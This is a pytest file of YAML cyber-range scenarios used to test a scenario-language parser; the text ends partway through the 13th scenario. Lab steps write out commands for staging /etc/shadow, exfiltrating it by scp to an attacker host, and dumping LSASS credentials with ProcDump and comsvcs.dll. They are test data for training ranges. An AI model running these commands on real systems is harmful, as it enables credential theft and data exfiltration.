"""Stress-test the SDL against 10 real-world scenarios from different platforms.

Each scenario attempts to faithfully represent a topology/exercise from
a known cyber range platform in APTL SDL format. This tests the
expressiveness boundaries of the language.
"""

import textwrap

import pytest

from aptl.core.sdl import parse_sdl, SDLParseError, SDLValidationError


def _parse(yaml_str: str, label: str):
    """Parse SDL and report what worked and what didn't."""
    try:
        s = parse_sdl(textwrap.dedent(yaml_str))
        return s, None
    except (SDLParseError, SDLValidationError) as e:
        return None, e


# -----------------------------------------------------------------------
# 1. OCR SDL: Full exercise from their test suite
# -----------------------------------------------------------------------

OCR_FULL_EXERCISE = """
name: ocr-full-exercise
description: Full OCR SDL exercise with all 14 sections

nodes:
  main-switch:
    type: Switch
  win-10:
    type: VM
    source: windows10
    resources:
      ram: 4 gib
      cpu: 2
    roles:
      admin: admin-user
      defender:
        username: blue-user
        entities:
          - blue-team.bob
    features:
      apache-svc: admin
    conditions:
      service-check: admin
    vulnerabilities:
      - sqli-vuln
  deb-server:
    type: VM
    source:
      name: debian11
      version: "2.0.0"
    resources:
      ram: 2 gib
      cpu: 1

infrastructure:
  main-switch:
    count: 1
    properties:
      cidr: 10.10.10.0/24
      gateway: 10.10.10.1
  win-10:
    count: 1
    links:
      - main-switch
    properties:
      - main-switch: 10.10.10.10
  deb-server:
    links:
      - main-switch
    dependencies:
      - win-10

features:
  apache-svc:
    type: Service
    source: apache-package
  web-config:
    type: Configuration
    source:
      name: web-cfg
      version: 1.0.0
    dependencies:
      - apache-svc
  artifact-lib:
    type: Artifact
    source: dl-library
    destination: /opt/lib

conditions:
  service-check:
    command: /usr/local/bin/check.sh
    interval: 30
  lib-condition:
    source: checker-pkg

vulnerabilities:
  sqli-vuln:
    name: SQL Injection
    description: SQLi in login form
    technical: true
    class: CWE-89

metrics:
  manual-grade:
    type: MANUAL
    artifact: true
    max-score: 10
  auto-grade:
    type: CONDITIONAL
    max-score: 10
    condition: service-check

evaluations:
  eval-1:
    metrics:
      - manual-grade
      - auto-grade
    min-score: 50

tlos:
  tlo-defense:
    name: Web Defense
    evaluation: eval-1

goals:
  goal-1:
    tlos:
      - tlo-defense

entities:
  blue-team:
    name: Blue Team
    role: Blue
    tlos:
      - tlo-defense
    entities:
      bob:
        name: Blue Bob
  red-team:
    name: Red Team
    role: Red

injects:
  attack-inject:
    source: attack-pkg
    from-entity: red-team
    to-entities:
      - blue-team
    tlos:
      - tlo-defense

events:
  attack-event:
    conditions:
      - service-check
    injects:
      - attack-inject

scripts:
  main-script:
    start-time: 5 min
    end-time: 2 hour
    speed: 1.0
    events:
      attack-event: 30 min

stories:
  main-story:
    speed: 1
    scripts:
      - main-script
"""


# -----------------------------------------------------------------------
# 2. CybORG CAGE-1 style: 3-host Metasploit vs Velociraptor
# -----------------------------------------------------------------------

CYBORG_CAGE1 = """
name: cyborg-cage1
description: >
  CybORG CAGE Challenge 1 topology: attacker, gateway, internal host,
  and a defender running Velociraptor.

nodes:
  attacker-net:
    type: Switch
  defender-net:
    type: Switch
  private-net:
    type: Switch
  attacker:
    type: VM
    source: kali-box
    resources:
      ram: 2 gib
      cpu: 2
  gateway:
    type: VM
    source: ubuntu-gateway
    resources:
      ram: 1 gib
      cpu: 1
    vulnerabilities:
      - ssh-brute
      - ms17-010
  internal:
    type: VM
    source: ubuntu-internal
    resources:
      ram: 1 gib
      cpu: 1
    vulnerabilities:
      - ms17-010
  defender:
    type: VM
    source: velociraptor-server
    resources:
      ram: 2 gib
      cpu: 1
    features:
      velociraptor-server: admin
    roles:
      admin: ubuntu

infrastructure:
  attacker-net:
    count: 1
    properties:
      cidr: 10.0.0.0/24
      gateway: 10.0.0.1
  defender-net:
    count: 1
    properties:
      cidr: 10.0.1.0/24
      gateway: 10.0.1.1
  private-net:
    count: 1
    properties:
      cidr: 10.0.2.0/24
      gateway: 10.0.2.1
  attacker:
    count: 1
    links:
      - attacker-net
  gateway:
    count: 1
    links:
      - private-net
      - attacker-net
  internal:
    count: 1
    links:
      - private-net
  defender:
    count: 1
    links:
      - defender-net
      - private-net

features:
  velociraptor-server:
    type: Service
    source: velociraptor

vulnerabilities:
  ssh-brute:
    name: SSH Brute Force
    description: Weak SSH credentials on gateway
    technical: true
    class: CWE-521
  ms17-010:
    name: EternalBlue (MS17-010)
    description: SMB remote code execution
    technical: true
    class: CWE-119

entities:
  red-agent:
    name: Red Agent
    role: Red
  blue-agent:
    name: Blue Agent
    role: Blue
"""


# -----------------------------------------------------------------------
# 3. CybORG CAGE-2 style: 13-host enterprise with OT
# -----------------------------------------------------------------------

CYBORG_CAGE2 = """
name: cyborg-cage2
description: >
  CybORG CAGE Challenge 2: 13-host enterprise with user, enterprise,
  and operational segments. Red/Blue/Green agents.

nodes:
  user-net:
    type: Switch
  enterprise-net:
    type: Switch
  operational-net:
    type: Switch
  user0:
    type: VM
    source: windows-user
    resources: {ram: 1 gib, cpu: 1}
  user1:
    type: VM
    source: windows-user
    resources: {ram: 1 gib, cpu: 1}
  user2:
    type: VM
    source: windows-user
    resources: {ram: 1 gib, cpu: 1}
  user3:
    type: VM
    source: windows-user
    resources: {ram: 1 gib, cpu: 1}
  user4:
    type: VM
    source: windows-user
    resources: {ram: 1 gib, cpu: 1}
  enterprise0:
    type: VM
    source: gateway
    resources: {ram: 1 gib, cpu: 1}
    vulnerabilities: [eternal-blue, bluekeep]
  enterprise1:
    type: VM
    source: internal-server
    resources: {ram: 1 gib, cpu: 1}
    vulnerabilities: [eternal-blue, http-rfi]
  enterprise2:
    type: VM
    source: internal-server
    resources: {ram: 1 gib, cpu: 1}
    vulnerabilities: [haraka-rce, ftp-traversal]
  defender:
    type: VM
    source: velociraptor-server
    resources: {ram: 2 gib, cpu: 2}
  op-server0:
    type: VM
    source: ot-server
    resources: {ram: 1 gib, cpu: 1}
  op-host0:
    type: VM
    source: ot-host
    resources: {ram: 1 gib, cpu: 1}
  op-host1:
    type: VM
    source: ot-host
    resources: {ram: 1 gib, cpu: 1}
  op-host2:
    type: VM
    source: ot-host
    resources: {ram: 1 gib, cpu: 1}

infrastructure:
  user-net:
    count: 1
    properties: {cidr: 10.0.0.0/24, gateway: 10.0.0.1}
  enterprise-net:
    count: 1
    properties: {cidr: 10.0.1.0/24, gateway: 10.0.1.1}
  operational-net:
    count: 1
    properties: {cidr: 10.0.2.0/24, gateway: 10.0.2.1}
  user0: {count: 1, links: [user-net]}
  user1: {count: 1, links: [user-net]}
  user2: {count: 1, links: [user-net]}
  user3: {count: 1, links: [user-net]}
  user4: {count: 1, links: [user-net]}
  enterprise0: {count: 1, links: [enterprise-net, user-net]}
  enterprise1: {count: 1, links: [enterprise-net]}
  enterprise2: {count: 1, links: [enterprise-net]}
  defender: {count: 1, links: [enterprise-net]}
  op-server0: {count: 1, links: [operational-net, enterprise-net]}
  op-host0: {count: 1, links: [operational-net]}
  op-host1: {count: 1, links: [operational-net]}
  op-host2: {count: 1, links: [operational-net]}

vulnerabilities:
  eternal-blue:
    name: EternalBlue
    description: MS17-010 SMB RCE
    technical: true
    class: CWE-119
  bluekeep:
    name: BlueKeep
    description: CVE-2019-0708 RDP RCE
    technical: true
    class: CWE-416
  http-rfi:
    name: HTTP Remote File Inclusion
    description: RFI via web application
    technical: true
    class: CWE-98
  haraka-rce:
    name: Haraka SMTP RCE
    description: RCE via malformed SMTP
    technical: true
    class: CWE-78
  ftp-traversal:
    name: FTP Directory Traversal
    description: Path traversal in FTP server
    technical: true
    class: CWE-22

entities:
  red:
    name: Red Agent
    role: Red
  blue:
    name: Blue Agent
    role: Blue
  green:
    name: Green Agent (normal users)
    role: Green
"""


# -----------------------------------------------------------------------
# 4. CALDERA-style: Ransack adversary profile (multi-step data theft)
# -----------------------------------------------------------------------

CALDERA_RANSACK = """
name: caldera-ransack
description: >
  CALDERA Ransack adversary profile: 18-step data theft operation
  modeled as attack steps with MITRE ATT&CK mapping.

metadata:
  id: caldera-ransack
  name: CALDERA Ransack Adversary
  description: Multi-step data theft operation inspired by CALDERA adversary profiles
  difficulty: advanced
  estimated_minutes: 45
  tags: [caldera, data-theft, exfiltration]
  mitre_attack:
    tactics: [Discovery, Collection, Exfiltration]
    techniques: [T1083, T1119, T1005, T1074, T1560, T1048]

mode: red

containers:
  required: [kali, victim]

objectives:
  red:
    - id: discover-files
      description: Discover sensitive files on target
      type: manual
      points: 50
    - id: stage-data
      description: Stage collected data for exfiltration
      type: command_output
      points: 100
      command_output:
        container: victim
        command: "ls /tmp/staged/"
        contains: ["sensitive"]
    - id: exfiltrate
      description: Exfiltrate data to attacker-controlled host
      type: file_exists
      points: 150
      file_exists:
        container: kali
        path: /home/kali/operations/exfil/loot.tar.gz
  blue: []

steps:
  - step_number: 1
    technique_id: T1083
    technique_name: File and Directory Discovery
    tactic: Discovery
    description: Enumerate sensitive file locations
    target: victim
    commands: ["find / -name '*.conf' -o -name '*.key' 2>/dev/null"]
  - step_number: 2
    technique_id: T1005
    technique_name: Data from Local System
    tactic: Collection
    description: Collect sensitive files
    target: victim
    commands: ["cp /etc/shadow /tmp/staged/"]
  - step_number: 3
    technique_id: T1074
    technique_name: Data Staged
    tactic: Collection
    description: Stage data in temporary directory
    target: victim
    commands: ["tar czf /tmp/staged/loot.tar.gz /tmp/staged/"]
  - step_number: 4
    technique_id: T1048
    technique_name: Exfiltration Over Alternative Protocol
    tactic: Exfiltration
    description: Exfiltrate via SCP
    target: kali
    commands: ["scp victim:/tmp/staged/loot.tar.gz /home/kali/operations/exfil/"]

scoring:
  passing_score: 150
  max_score: 300
"""


# -----------------------------------------------------------------------
# 5. Atomic Red Team style: credential dumping test battery
# -----------------------------------------------------------------------

ATOMIC_CRED_DUMP = """
name: atomic-credential-dumping
description: >
  Atomic Red Team T1003.001 credential dumping tests adapted
  to SDL format. Tests LSASS memory access techniques.

metadata:
  id: atomic-cred-dump
  name: Credential Dumping Test Battery
  description: LSASS credential dumping techniques from Atomic Red Team
  difficulty: intermediate
  estimated_minutes: 30
  tags: [atomic-red-team, credential-access, lsass]
  mitre_attack:
    techniques: [T1003.001]

mode: red

containers:
  required: [kali, victim]

objectives:
  red:
    - id: procdump-lsass
      description: Dump LSASS using ProcDump
      type: manual
      points: 50
    - id: comsvcs-dump
      description: Dump LSASS using comsvcs.dll MiniDump
      type: manual
      points: 50
    - id: mimikatz-extract
      description: Extract credentials with Mimikatz
      type: command_output
      points: 100
      command_output:
        container: kali
        command: cat /home/kali/operations/creds.txt
        contains: ["Username", "Password"]
  blue: []

steps:
  - step_number: 1
    technique_id: T1003.001
    technique_name: "LSASS Memory"
    tactic: "Credential Access"
    description: "Dump LSASS process memory via ProcDump"
    target: victim
    commands:
      - 'procdump.exe -accepteula -ma lsass.exe lsass.dmp'
    expected_detections:
      - product_name: wazuh
        severity_id: 4
        description: Process access to LSASS detected
        max_detection_time_seconds: 30
  - step_number: 2
    technique_id: T1003.001
    technique_name: "LSASS Memory"
    tactic: "Credential Access"
    description: "Dump via comsvcs.dll MiniDump"
    target: victim
    commands:
      - 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump PID dump.bin full'
    expected_detections:
      - product_name: wazuh
        severity_id: 5
        description: Rundll32 loading comsvcs.dll for MiniDump
        max_detection_time_seconds: 15

scoring:
  passing_score: 100
  max_score: 200
"""


# -----------------------------------------------------------------------
# 6. CyRIS-style: DMZ with firewall rules
# -----------------------------------------------------------------------

CYRIS_DMZ = """
name: cyris-dmz-topology
description: >
  CyRIS-style DMZ topology with web server, database, and firewall.
  Models a basic enterprise perimeter.

nodes:
  wan-switch:
    type: Switch
  dmz-switch:
    type: Switch
  lan-switch:
    type: Switch
  firewall:
    type: VM
    source: pfsense
    resources: {ram: 512 mib, cpu: 1}
    features:
      fw-rules: admin
    roles:
      admin: root
  webserver:
    type: VM
    source: ubuntu-apache
    resources: {ram: 1 gib, cpu: 1}
    features:
      apache-web: www
      php-app: www
    conditions:
      http-alive: www
    vulnerabilities: [sqli-web, lfi-web]
    roles:
      www: www-data
  database:
    type: VM
    source: ubuntu-mysql
    resources: {ram: 1 gib, cpu: 1}
    features:
      mysql-server: dba
    conditions:
      mysql-alive: dba
    roles:
      dba: mysql
  attacker:
    type: VM
    source: kali-linux
    resources: {ram: 2 gib, cpu: 2}

infrastructure:
  wan-switch:
    count: 1
    properties: {cidr: 192.168.1.0/24, gateway: 192.168.1.1}
  dmz-switch:
    count: 1
    properties: {cidr: 172.16.0.0/24, gateway: 172.16.0.1}
  lan-switch:
    count: 1
    properties: {cidr: 10.0.0.0/24, gateway: 10.0.0.1}
  firewall:
    count: 1
    links: [wan-switch, dmz-switch, lan-switch]
  webserver:
    count: 1
    links: [dmz-switch]
    dependencies: [firewall]
  database:
    count: 1
    links: [lan-switch]
    dependencies: [firewall]
  attacker:
    count: 1
    links: [wan-switch]

features:
  fw-rules:
    type: Configuration
    source: pfsense-rules
    description: Firewall rules allowing HTTP to DMZ, deny LAN from WAN
  apache-web:
    type: Service
    source: apache2
  php-app:
    type: Service
    source: vulnerable-php-app
    dependencies: [apache-web]
  mysql-server:
    type: Service
    source: mysql-5.7

conditions:
  http-alive:
    command: "curl -sf http://localhost/ || exit 1"
    interval: 15
  mysql-alive:
    command: "mysqladmin ping -u root"
    interval: 15

vulnerabilities:
  sqli-web:
    name: SQL Injection
    description: SQLi in PHP application login
    technical: true
    class: CWE-89
  lfi-web:
    name: Local File Inclusion
    description: LFI via path traversal in file parameter
    technical: true
    class: CWE-98
"""


# -----------------------------------------------------------------------
# 7. KYPO-style: CTF training with scoring
# -----------------------------------------------------------------------

KYPO_CTF = """
name: kypo-ctf-training
description: >
  KYPO-style CTF training exercise with multi-level challenges
  and progressive hints.

nodes:
  training-net:
    type: Switch
  challenge-server:
    type: VM
    source: ubuntu-ctf
    resources: {ram: 2 gib, cpu: 2}
    vulnerabilities: [weak-ssh, exposed-backup, suid-binary]
  scoreboard:
    type: VM
    source: ctfd-server
    resources: {ram: 1 gib, cpu: 1}

infrastructure:
  training-net:
    count: 1
    properties: {cidr: 10.10.0.0/24, gateway: 10.10.0.1}
  challenge-server:
    count: 1
    links: [training-net]
  scoreboard:
    count: 1
    links: [training-net]

vulnerabilities:
  weak-ssh:
    name: Weak SSH Password
    description: SSH service with default credentials
    technical: false
    class: CWE-521
  exposed-backup:
    name: Exposed Backup File
    description: Database backup accessible via web
    technical: true
    class: CWE-538
  suid-binary:
    name: SUID Binary Exploit
    description: Custom SUID binary with buffer overflow
    technical: true
    class: CWE-120

entities:
  trainers:
    name: Training Staff
    role: White
  participants:
    name: CTF Participants
    role: Blue
    entities:
      team-alpha:
        name: Team Alpha
      team-bravo:
        name: Team Bravo

conditions:
  flag-check-1:
    command: "/opt/ctf/check_flag.sh level1"
    interval: 10
  flag-check-2:
    command: "/opt/ctf/check_flag.sh level2"
    interval: 10
  flag-check-3:
    command: "/opt/ctf/check_flag.sh level3"
    interval: 10

metrics:
  level-1:
    type: CONDITIONAL
    max-score: 100
    condition: flag-check-1
  level-2:
    type: CONDITIONAL
    max-score: 200
    condition: flag-check-2
  level-3:
    type: CONDITIONAL
    max-score: 300
    condition: flag-check-3

evaluations:
  ctf-eval:
    metrics: [level-1, level-2, level-3]
    min-score:
      absolute: 300

tlos:
  ctf-skills:
    name: CTF Problem Solving
    evaluation: ctf-eval

goals:
  complete-ctf:
    tlos: [ctf-skills]
"""


# -----------------------------------------------------------------------
# 8. Hack The Box style: single-machine challenge
# -----------------------------------------------------------------------

HTB_MACHINE = """
name: htb-style-machine
description: >
  Hack The Box style single-machine challenge. Web app initial access,
  privilege escalation to root.

nodes:
  challenge-net:
    type: Switch
  target:
    type: VM
    source: htb-machine-easy
    resources: {ram: 1 gib, cpu: 1}
    features:
      nginx-web: www
      vulnerable-api: www
    conditions:
      web-health: www
    vulnerabilities:
      - api-idor
      - sudo-miscfg
    roles:
      www: www-data
      user: htb-user
      root: root

infrastructure:
  challenge-net:
    count: 1
    properties: {cidr: 10.10.10.0/24, gateway: 10.10.10.1}
  target:
    count: 1
    links: [challenge-net]
    properties:
      - challenge-net: 10.10.10.50

features:
  nginx-web:
    type: Service
    source: nginx
  vulnerable-api:
    type: Service
    source: nodejs-api
    dependencies: [nginx-web]

conditions:
  web-health:
    command: "curl -sf http://localhost:80/ || exit 1"
    interval: 15

vulnerabilities:
  api-idor:
    name: API IDOR
    description: Insecure Direct Object Reference in REST API
    technical: true
    class: CWE-639
  sudo-miscfg:
    name: Sudo Misconfiguration
    description: User can run vim as root without password
    technical: true
    class: CWE-269
"""


# -----------------------------------------------------------------------
# 9. Enterprise AD lab: multi-forest with trust relationships
# -----------------------------------------------------------------------

ENTERPRISE_AD = """
name: enterprise-ad-lab
description: >
  Enterprise Active Directory lab with parent and child domains,
  trust relationships, and multi-tier architecture.

nodes:
  corp-net:
    type: Switch
  dmz-net:
    type: Switch
  mgmt-net:
    type: Switch
  dc01:
    type: VM
    source: windows-server-2022
    resources: {ram: 4 gib, cpu: 2}
    features: {ad-forest-root: admin}
    vulnerabilities: [as-rep-roast, gpp-passwords]
    roles: {admin: Administrator}
  dc02:
    type: VM
    source: windows-server-2022
    resources: {ram: 4 gib, cpu: 2}
    features: {ad-child-domain: admin}
    vulnerabilities: [unconstrained-deleg]
    roles: {admin: Administrator}
  exchange:
    type: VM
    source: windows-server-2019
    resources: {ram: 8 gib, cpu: 4}
    features: {exchange-server: admin}
    vulnerabilities: [proxylogon]
    roles: {admin: Administrator}
  fileserver:
    type: VM
    source: windows-server-2022
    resources: {ram: 2 gib, cpu: 1}
    vulnerabilities: [open-smb-shares]
  ws01:
    type: VM
    source: windows-10-enterprise
    resources: {ram: 4 gib, cpu: 2}
    vulnerabilities: [local-admin-reuse]
  ws02:
    type: VM
    source: windows-10-enterprise
    resources: {ram: 4 gib, cpu: 2}
  linux-jump:
    type: VM
    source: ubuntu-22.04
    resources: {ram: 1 gib, cpu: 1}
    features: {ssh-bastion: admin}
    conditions: {ssh-alive: admin}
    roles:
      admin: sysadmin

infrastructure:
  corp-net:
    count: 1
    properties: {cidr: 10.0.0.0/16, gateway: 10.0.0.1}
  dmz-net:
    count: 1
    properties: {cidr: 172.16.0.0/24, gateway: 172.16.0.1}
  mgmt-net:
    count: 1
    properties: {cidr: 192.168.100.0/24, gateway: 192.168.100.1}
  dc01: {count: 1, links: [corp-net]}
  dc02: {count: 1, links: [corp-net], dependencies: [dc01]}
  exchange: {count: 1, links: [corp-net, dmz-net], dependencies: [dc01]}
  fileserver: {count: 1, links: [corp-net]}
  ws01: {count: 1, links: [corp-net]}
  ws02: {count: 1, links: [corp-net]}
  linux-jump: {count: 1, links: [dmz-net, mgmt-net]}

features:
  ad-forest-root:
    type: Service
    source: adds-forest-root
    description: AD DS forest root (corp.local)
  ad-child-domain:
    type: Service
    source: adds-child
    dependencies: [ad-forest-root]
    description: Child domain (dev.corp.local)
  exchange-server:
    type: Service
    source: exchange-2019
    dependencies: [ad-forest-root]
  ssh-bastion:
    type: Service
    source: openssh-server

conditions:
  ssh-alive:
    command: "ss -tlnp | grep ':22' || exit 1"
    interval: 15

vulnerabilities:
  as-rep-roast:
    name: AS-REP Roasting
    description: Accounts without Kerberos pre-authentication
    technical: true
    class: CWE-287
  gpp-passwords:
    name: GPP Passwords
    description: Passwords in Group Policy Preferences
    technical: true
    class: CWE-312
  unconstrained-deleg:
    name: Unconstrained Delegation
    description: Computer with unconstrained delegation enabled
    technical: true
    class: CWE-250
  proxylogon:
    name: ProxyLogon
    description: CVE-2021-26855 Exchange Server SSRF
    technical: true
    class: CWE-918
  open-smb-shares:
    name: Open SMB Shares
    description: Sensitive data on world-readable shares
    technical: false
    class: CWE-732
  local-admin-reuse:
    name: Local Admin Password Reuse
    description: Same local admin password across workstations
    technical: false
    class: CWE-521
"""


# -----------------------------------------------------------------------
# 10. Cloud-hybrid: AWS VPC + on-prem with VPN tunnel
# -----------------------------------------------------------------------

CLOUD_HYBRID = """
name: cloud-hybrid-scenario
description: >
  Hybrid cloud/on-prem topology modeling an AWS VPC connected
  to on-premises network via VPN. Tests SDL with cloud-like
  topology patterns.

nodes:
  aws-vpc:
    type: Switch
    description: AWS VPC (simulated)
  onprem-lan:
    type: Switch
    description: On-premises corporate LAN
  vpn-tunnel:
    type: Switch
    description: Site-to-site VPN tunnel
  web-alb:
    type: VM
    source: nginx-proxy
    resources: {ram: 512 mib, cpu: 1}
    description: Application load balancer
  app-server-1:
    type: VM
    source: nodejs-app
    resources: {ram: 2 gib, cpu: 2}
    features: {node-app: app-svc}
    vulnerabilities: [ssrf-vuln]
    roles: {app-svc: node}
  app-server-2:
    type: VM
    source: nodejs-app
    resources: {ram: 2 gib, cpu: 2}
    features: {node-app: app-svc}
    roles: {app-svc: node}
  rds-primary:
    type: VM
    source: postgres-14
    resources: {ram: 4 gib, cpu: 2}
    features: {postgres-db: dba}
    conditions: {pg-health: dba}
    vulnerabilities: [weak-rds-creds]
    roles:
      dba: postgres
  onprem-dc:
    type: VM
    source: windows-server-2019
    resources: {ram: 4 gib, cpu: 2}
    description: On-premises domain controller
    vulnerabilities: [zerologon]
  onprem-workstation:
    type: VM
    source: windows-10
    resources: {ram: 4 gib, cpu: 2}

infrastructure:
  aws-vpc:
    count: 1
    properties: {cidr: 10.0.0.0/16, gateway: 10.0.0.1}
  onprem-lan:
    count: 1
    properties: {cidr: 192.168.0.0/16, gateway: 192.168.0.1}
  vpn-tunnel:
    count: 1
    properties: {cidr: 169.254.0.0/30, gateway: 169.254.0.1}
  web-alb: {count: 1, links: [aws-vpc]}
  app-server-1: {count: 1, links: [aws-vpc], dependencies: [rds-primary]}
  app-server-2: {count: 1, links: [aws-vpc], dependencies: [rds-primary]}
  rds-primary: {count: 1, links: [aws-vpc]}
  onprem-dc: {count: 1, links: [onprem-lan]}
  onprem-workstation: {count: 1, links: [onprem-lan]}

features:
  node-app:
    type: Service
    source: express-api
  postgres-db:
    type: Service
    source: postgresql-14

conditions:
  pg-health:
    command: "pg_isready"
    interval: 10

vulnerabilities:
  ssrf-vuln:
    name: SSRF to Metadata Service
    description: SSRF allowing access to cloud metadata (169.254.169.254)
    technical: true
    class: CWE-918
  weak-rds-creds:
    name: Weak Database Credentials
    description: Default RDS master password
    technical: false
    class: CWE-521
  zerologon:
    name: Zerologon (CVE-2020-1472)
    description: Netlogon privilege escalation
    technical: true
    class: CWE-330
"""


# =======================================================================
# Test execution
# =======================================================================

# -----------------------------------------------------------------------
# 11. Exchange server with mailboxes, accounts, ACLs, and content
# -----------------------------------------------------------------------

EXCHANGE_WITH_DATA = """
name: exchange-phishing-exercise
description: >
  Exchange server with user accounts, phishing lure emails, sensitive
  financial data, and network access controls. Tests the content,
  accounts, ACLs, services, os, and asset_value extensions.

nodes:
  corp-net:
    type: Switch
  dmz-net:
    type: Switch
  exchange:
    type: VM
    os: windows
    os_version: "Server 2019"
    source: exchange-2019
    resources: {ram: 8 gib, cpu: 4}
    features: [exchange-server, outlook-web]
    services:
      - port: 443
        protocol: tcp
        name: https
      - port: 25
        protocol: tcp
        name: smtp
      - port: 587
        protocol: tcp
        name: submission
    vulnerabilities: [proxylogon]
    asset_value:
      confidentiality: high
      integrity: high
      availability: critical
  dc:
    type: VM
    os: windows
    os_version: "Server 2022"
    source: windows-server-2022
    resources: {ram: 4 gib, cpu: 2}
    features: [ad-ds]
  attacker:
    type: VM
    os: linux
    source: kali
    resources: {ram: 2 gib, cpu: 2}

infrastructure:
  corp-net:
    count: 1
    properties:
      cidr: 10.0.0.0/24
      gateway: 10.0.0.1
      internal: true
  dmz-net:
    count: 1
    properties:
      cidr: 172.16.0.0/24
      gateway: 172.16.0.1
    acls:
      - direction: in
        from_net: corp-net
        protocol: tcp
        ports: [443, 25]
        action: allow
      - direction: out
        to_net: corp-net
        action: deny
  exchange: {count: 1, links: [corp-net, dmz-net]}
  dc: {count: 1, links: [corp-net]}
  attacker: {count: 1, links: [dmz-net]}

features:
  exchange-server:
    type: Service
    source: exchange-2019
  outlook-web:
    type: Service
    dependencies: [exchange-server]
    source: owa-frontend
  ad-ds:
    type: Service
    source: adds-forest-root

vulnerabilities:
  proxylogon:
    name: ProxyLogon (CVE-2021-26855)
    description: Exchange Server SSRF leading to RCE
    technical: true
    class: CWE-918

accounts:
  ceo:
    username: ceo
    node: exchange
    groups: [Domain Admins, Executives]
    mail: ceo@techvault.local
    password_strength: strong
  cfo:
    username: cfo
    node: exchange
    groups: [Finance, Executives]
    mail: cfo@techvault.local
    password_strength: strong
  finance-analyst:
    username: jsmith
    node: exchange
    groups: [Finance]
    mail: jsmith@techvault.local
    password_strength: weak
    description: "Target for spearphishing - weak password"
  svc-backup:
    username: svc_backup
    node: dc
    groups: [Backup Operators]
    password_strength: weak
    spn: "MSSQL/db.techvault.local"
    description: "Kerberoastable service account"

content:
  phishing-lures:
    type: dataset
    target: exchange
    destination: /var/mail/jsmith/
    format: eml
    description: "Spearphishing emails targeting finance analyst"
    sensitive: true
    items:
      - name: "Q3 Budget Review - Action Required.eml"
        tags: [phishing, attachment, macro]
      - name: "Urgent Wire Transfer Approval.eml"
        tags: [phishing, link, credential-harvesting]
      - name: "Updated Benefits Enrollment.eml"
        tags: [phishing, attachment, exe-in-zip]
  sensitive-financials:
    type: dataset
    target: exchange
    destination: /var/mail/cfo/
    format: eml
    description: "Legitimate confidential financial emails"
    sensitive: true
    items:
      - name: "Board Minutes - Q3 Confidential.eml"
        tags: [pii, financial, exfil-target]
      - name: "M&A Target List - Internal Only.eml"
        tags: [financial, exfil-target]
  planted-webshell:
    type: file
    target: exchange
    path: /inetpub/wwwroot/aspnet_client/shell.aspx
    description: "Pre-staged webshell simulating ProxyLogon exploitation"
    sensitive: true
    tags: [webshell, initial-access]

entities:
  red-team:
    name: Red Team
    role: Red
    mission: "Exploit Exchange via ProxyLogon, exfiltrate financial data"
  blue-team:
    name: Blue Team
    role: Blue
    mission: "Detect Exchange compromise, contain lateral movement"
    entities:
      soc-analyst:
        name: SOC Analyst
"""


# -----------------------------------------------------------------------
# 12. CybORG CAGE-2 with agents, relationships, accounts
# -----------------------------------------------------------------------

CYBORG_WITH_AGENTS = """
name: cyborg-cage2-agents
description: >
  CybORG CAGE-2 with red/blue/green agents, starting accounts,
  initial knowledge, allowed subnets, and service relationships.

nodes:
  user-net: {type: Switch}
  enterprise-net: {type: Switch}
  op-net: {type: Switch}
  user0: {type: VM, os: linux, resources: {ram: 1 gib, cpu: 1}}
  user1: {type: VM, os: linux, resources: {ram: 1 gib, cpu: 1}}
  enterprise0: {type: VM, os: linux, resources: {ram: 1 gib, cpu: 1}, vulnerabilities: [eternalblue]}
  enterprise1: {type: VM, os: linux, resources: {ram: 1 gib, cpu: 1}}
  defender: {type: VM, os: linux, resources: {ram: 2 gib, cpu: 2}, features: {velociraptor: velo-admin}, roles: {velo-admin: ubuntu}}
  op-server0: {type: VM, os: linux, resources: {ram: 1 gib, cpu: 1}}

infrastructure:
  user-net: {count: 1, properties: {cidr: 10.0.0.0/24, gateway: 10.0.0.1}}
  enterprise-net: {count: 1, properties: {cidr: 10.0.1.0/24, gateway: 10.0.1.1}}
  op-net: {count: 1, properties: {cidr: 10.0.2.0/24, gateway: 10.0.2.1, internal: true}}
  user0: {count: 1, links: [user-net]}
  user1: {count: 1, links: [user-net]}
  enterprise0: {count: 1, links: [enterprise-net, user-net]}
  enterprise1: {count: 1, links: [enterprise-net]}
  defender: {count: 1, links: [enterprise-net]}
  op-server0: {count: 1, links: [op-net, enterprise-net]}

features:
  velociraptor: {type: Service, source: velociraptor-server}

vulnerabilities:
  eternalblue: {name: EternalBlue, description: MS17-010, technical: true, class: CWE-119}

accounts:
  phished-user:
    username: jdoe
    node: user0
    password_strength: weak
    description: "Initial foothold via spearphishing"
  soc-admin:
    username: soc-analyst
    node: defender
    password_strength: strong
  green-user:
    username: employee
    node: user0
    password_strength: medium

entities:
  red-team: {name: Red Team, role: Red}
  blue-team:
    name: Blue Team
    role: Blue
    entities:
      analyst: {name: SOC Analyst}
  green-team: {name: Normal Users, role: Green}

agents:
  red-agent:
    entity: red-team
    actions: [DiscoverRemoteSystems, DiscoverNetworkServices, ExploitRemoteService, EternalBlue, SSHBruteForce, PrivilegeEscalate, Impact]
    starting_accounts: [phished-user]
    initial_knowledge:
      hosts: [user0]
      subnets: [user-net]
    allowed_subnets: [user-net, enterprise-net]
    reward_calculator: HybridImpactPwn

  blue-agent:
    entity: blue-team.analyst
    actions: [Monitor, Analyse, Remove, Restore, DecoyApache, DecoySSHD]
    starting_accounts: [soc-admin]
    initial_knowledge:
      hosts: [defender, enterprise0, enterprise1, user0, user1]
      subnets: [user-net, enterprise-net, op-net]
    allowed_subnets: [user-net, enterprise-net, op-net]
    reward_calculator: HybridAvailabilityConfidentiality

  green-agent:
    entity: green-team
    actions: [NormalBrowsing, EmailCheck, FileAccess]
    starting_accounts: [green-user]
    allowed_subnets: [user-net]
    description: "Simulates normal user behavior"

relationships:
  velo-monitors-enterprise:
    type: manages
    source: velociraptor
    target: enterprise0
    description: "Velociraptor monitors enterprise hosts"
"""


# -----------------------------------------------------------------------
# 13. Multi-domain AD with trust, federation, and variables
# -----------------------------------------------------------------------

AD_TRUST_FEDERATED = """
name: multi-domain-ad-trust
description: >
  Multi-domain AD with parent-child trust, ADFS federation to
  cloud IdP, parameterized via variables, service relationships.

variables:
  domain_name:
    type: string
    default: "corp.local"
    description: "Root AD domain name"
  child_domain:
    type: string
    default: "dev.corp.local"
    description: "Child AD domain name"
  workstation_count:
    type: integer
    default: 3
    description: "Number of employee workstations"

nodes:
  corp-net: {type: Switch}
  dmz-net: {type: Switch}
  dc01:
    type: VM
    os: windows
    os_version: "Server 2022"
